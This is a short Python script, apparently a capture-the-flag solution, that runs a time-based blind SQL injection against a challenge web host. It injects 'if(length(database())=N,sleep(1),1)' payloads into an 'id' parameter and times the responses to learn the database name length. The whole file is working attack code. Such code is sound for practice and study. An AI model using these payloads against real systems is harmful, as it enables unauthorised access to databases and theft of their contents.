#encoding=utf-8
import requests
import os
import time

url="http://webt2.chall.ctf.l3hsec.com/"

def DbLen():
	for i in range(1,10):
		payload="?id=if(length(database())={},sleep(1),1)--+".format(i)
		req_url=url+payload
		start_time=time.time()
		rep=requests.get(url=req_url)
		end_time = time.time()
		t = end_time - start_time
		if t > 1:
			print("DB length is "+str(i))
DbLen()
